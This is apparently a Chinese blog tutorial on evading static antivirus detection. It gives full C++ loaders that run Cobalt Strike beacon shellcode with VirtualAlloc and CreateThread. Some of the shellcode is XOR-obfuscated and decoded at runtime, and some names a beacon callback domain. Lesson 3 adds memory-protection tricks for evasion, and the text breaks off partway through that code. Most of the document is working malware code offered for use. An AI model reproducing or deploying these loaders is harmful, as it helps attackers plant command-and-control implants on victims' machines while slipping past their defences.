<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x3b\xca\x60\x4a\xbe\x1a\x62\x0a\x1a\x0a\x0a\x62\xf5\xf5\x0d\x0a\x60\x0a\x62\x52\xae\x59\xef\xf5\xdf\x89\xca\x4a\x83\xcd\x5a\x3b\xca\xba\x7a\xbe\x63\x5a\x62\x6e\x64\x79\x6b\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\xb1\x6b\x0a\x0a\x0a\xe1\x71\x52\x83\xcc\x89\xe5\x4a\xf6\xb3\x4a\x0a\x0a\x0a\xf9\xae\x83\xf2\x89\xe2\x4a\x4a\x8a\xf1\x70\x74\x38\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x10\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x0d\xb1\x6b\x0a\x0a\x0a\x82\x12\x42\x42\xb1\x6b\x0a\x0a\x0a\x82\x12\x83\xf9\x83\xcc\x5e\x51\x89\xe1\x0e\x59\x60\x0a\x59\x60\x0a\x62\x42\x08\x0a\x0a\x60\x1a\x5a\x62\x60\xc3\x96\xc3\xf5\xdf\x8f\xca\x7f\x5b\x83\xfa\x42\xb9\x0a\x82\x12\x4a\x81\x3a\xe1\x7a\xe2\x8a\xf5\xf5\xf5\x0a\x6b\x6b\x6b\x24\x66\x65\x7c\x6f\x38\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x24\x66\x65\x7c\x6f\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x83\xfa\x42\x81\x02\x4b\x82\x02\x8a\xf3\x55\x74\x0d\x62\xfa\xbf\xa8\x5c\xf5\xdf\x62\xe2\x19\x0a\x0a\x62\x4e\xfa\x3f\xea\xf5\xdf\x83\xfa\x81\x02\x83\xc1\xe3\x29\xf5\xf5\xf5\x8d\xf0\x55\x81\x4d\x12\x89\xf2\x0b\x7f\x33\x89\xcd\x16\x81\x35\x8d\xd4\x83\xf4\x81\x76\x2e\x02\x3b\xc3\xbb\xf5\xf9\xae\x5d\x5d\x5d\x49\x8d\xf0\x58\x5d\x59\x8b\xe0\xf5\x0a\x0a\x0a\x58\x62\xfe\x0a\x84\xc6\xf5\xdf\x51\x55\x50\x37\xf5\x0a\x0a\x0a\x76\x0d\xe3\xd5\xf4\xf5\xf5\x83\xdd\x8b\xcd\x1f\x0a\x0a\x0a\xf5\xed\x0a\x0a\x0a\x0a</span><br></pre></td></tr></table></figure>



<h1 id="静态恶意代码逃逸（第二课）"><a href="#静态恶意代码逃逸（第二课）" class="headerlink" title="静态恶意代码逃逸（第二课）"></a>静态恶意代码逃逸（第二课）</h1><h2 id="关于Windows操作系统内存"><a href="#关于Windows操作系统内存" class="headerlink" title="关于Windows操作系统内存"></a>关于Windows操作系统内存</h2><p>Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p>
<p>操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。</p>
<p>在进程申请时，需要声明这块内存的基本信息：<strong>申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</strong></p>
<p>申请方式：</p>
<ul>
<li>HeapAlloc</li>
<li>malloc</li>
<li>VirtualAlloc</li>
<li>new</li>
<li>LocalAlloc</li>
<li>…</li>
</ul>
<h2 id="申请内存API的关系"><a href="#申请内存API的关系" class="headerlink" title="申请内存API的关系"></a>申请内存API的关系</h2><p>其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。</p>
<h2 id="实现一次正常加载"><a href="#实现一次正常加载" class="headerlink" title="实现一次正常加载"></a>实现一次正常加载</h2><p>使用cobaltstrike默认的shellcode进行加载</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x3b\xca\x60\x4a\xbe\x1a\x62\x0a\x1a\x0a\x0a\x62\xf5\xf5\x0d\x0a\x60\x0a\x62\x52\xae\x59\xef\xf5\xdf\x89\xca\x4a\x83\xcd\x5a\x3b\xca\xba\x7a\xbe\x63\x5a\x62\x6e\x64\x79\x6b\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\xb1\x6b\x0a\x0a\x0a\xe1\x71\x52\x83\xcc\x89\xe5\x4a\xf6\xb3\x4a\x0a\x0a\x0a\xf9\xae\x83\xf2\x89\xe2\x4a\x4a\x8a\xf1\x70\x74\x38\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x10\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x0d\xb1\x6b\x0a\x0a\x0a\x82\x12\x42\x42\xb1\x6b\x0a\x0a\x0a\x82\x12\x83\xf9\x83\xcc\x5e\x51\x89\xe1\x0e\x59\x60\x0a\x59\x60\x0a\x62\x42\x08\x0a\x0a\x60\x1a\x5a\x62\x60\xc3\x96\xc3\xf5\xdf\x8f\xca\x7f\x5b\x83\xfa\x42\xb9\x0a\x82\x12\x4a\x81\x3a\xe1\x7a\xe2\x8a\xf5\xf5\xf5\x0a\x6b\x6b\x6b\x24\x66\x65\x7c\x6f\x38\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x24\x66\x65\x7c\x6f\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x83\xfa\x42\x81\x02\x4b\x82\x02\x8a\xf3\x55\x74\x0d\x62\xfa\xbf\xa8\x5c\xf5\xdf\x62\xe2\x19\x0a\x0a\x62\x4e\xfa\x3f\xea\xf5\xdf\x83\xfa\x81\x02\x83\xc1\xe3\x29\xf5\xf5\xf5\x8d\xf0\x55\x81\x4d\x12\x89\xf2\x0b\x7f\x33\x89\xcd\x16\x81\x35\x8d\xd4\x83\xf4\x81\x76\x2e\x02\x3b\xc3\xbb\xf5\xf9\xae\x5d\x5d\x5d\x49\x8d\xf0\x58\x5d\x59\x8b\xe0\xf5\x0a\x0a\x0a\x58\x62\xfe\x0a\x84\xc6\xf5\xdf\x51\x55\x50\x37\xf5\x0a\x0a\x0a\x76\x0d\xe3\xd5\xf4\xf5\xf5\x83\xdd\x8b\xcd\x1f\x0a\x0a\x0a\xf5\xed\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="实现一次混淆加载"><a href="#实现一次混淆加载" class="headerlink" title="实现一次混淆加载"></a>实现一次混淆加载</h2><p>使用之前的Python脚本混淆生成RAW文件，最后得到混淆后的数组：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x31\xc0\x6a\x40\xb4\x10\x68\x00\x10\x00\x00\x68\xff\xff\x07\x00\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x83\xc0\x40\x89\xc7\x50\x31\xc0\xb0\x70\xb4\x69\x50\x68\x64\x6e\x73\x61\x54\x68\x4c\x77\x26\x07\xff\xd5\xbb\x61\x00\x00\x00\xeb\x7b\x58\x89\xc6\x83\xef\x40\xfc\xb9\x40\x00\x00\x00\xf3\xa4\x89\xf8\x83\xe8\x40\x40\x80\xfb\x7a\x7e\x32\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x1a\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x07\xbb\x61\x00\x00\x00\x88\x18\x48\x48\xbb\x61\x00\x00\x00\x88\x18\x89\xf3\x89\xc6\x54\x5b\x83\xeb\x04\x53\x6a\x00\x53\x6a\x00\x68\x48\x02\x00\x00\x6a\x10\x50\x68\x6a\xc9\x9c\xc9\xff\xd5\x85\xc0\x75\x51\x89\xf0\x48\xb3\x00\x88\x18\x40\x8b\x30\xeb\x70\xe8\x80\xff\xff\xff\x00\x61\x61\x61\x2e\x6c\x6f\x76\x65\x32\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x2e\x6c\x6f\x76\x65\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x89\xf0\x48\x8b\x08\x41\x88\x08\x80\xf9\x5f\x7e\x07\x68\xf0\xb5\xa2\x56\xff\xd5\x68\xe8\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x89\xf0\x8b\x08\x89\xcb\xe9\x23\xff\xff\xff\x87\xfa\x5f\x8b\x47\x18\x83\xf8\x01\x75\x39\x83\xc7\x1c\x8b\x3f\x87\xde\x89\xfe\x8b\x7c\x24\x08\x31\xc9\xb1\xff\xf3\xa4\x57\x57\x57\x43\x87\xfa\x52\x57\x53\x81\xea\xff\x00\x00\x00\x52\x68\xf4\x00\x8e\xcc\xff\xd5\x5b\x5f\x5a\x3d\xff\x00\x00\x00\x7c\x07\xe9\xdf\xfe\xff\xff\x89\xd7\x81\xc7\x15\x00\x00\x00\xff\xe7\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="第三课"><a href="#第三课" class="headerlink" title="第三课"></a>第三课</h1><h2 id="内存申请的优化"><a href="#内存申请的优化" class="headerlink" title="内存申请的优化"></a>内存申请的优化</h2><p>在申请内存页时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 增加异或代码 */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;shellcode_size; i++)&#123;</span><br><span class="line">    buf[i] ^= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    